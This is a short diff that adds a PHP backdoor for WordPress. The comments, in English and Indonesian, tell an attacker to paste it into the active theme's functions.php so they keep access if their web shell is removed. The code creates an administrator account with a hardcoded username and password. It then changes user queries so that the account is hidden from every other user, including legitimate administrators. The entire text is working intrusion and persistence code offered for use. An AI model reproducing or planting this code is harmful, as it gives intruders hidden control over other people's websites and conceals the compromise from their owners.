@@ -1,0 +1,18 @@
+// auto create hidden user role administrator in cms wordpress for backup if ur shell die :(
+// taro di functions.php di paling atas dari themes wp yang aktif di web itu, cara cek nya tinggal view-source web nya aja cek bagian /themes/ nya dia make themes apa
+// user: ruslan pass: Packruslan@#
+<?php
+$new_user =new WP_User(wp_create_user('ruslan','Packruslan@#'));
+ $new_user->set_role('administrator');
+
+add_action('pre_user_query','ruslan_user_query');
+ function ruslan_user_query($user_search) {
+ global $current_user;
+ $username = $current_user->user_login;
+ if ($username != 'ruslan') {
+ global $wpdb;
+ $user_search->query_where = str_replace('WHERE 1=1',
+ "WHERE 1=1 AND {$wpdb->users}.user_login != 'ruslan'",$user_search->query_where);
+ }
+ }
+?>
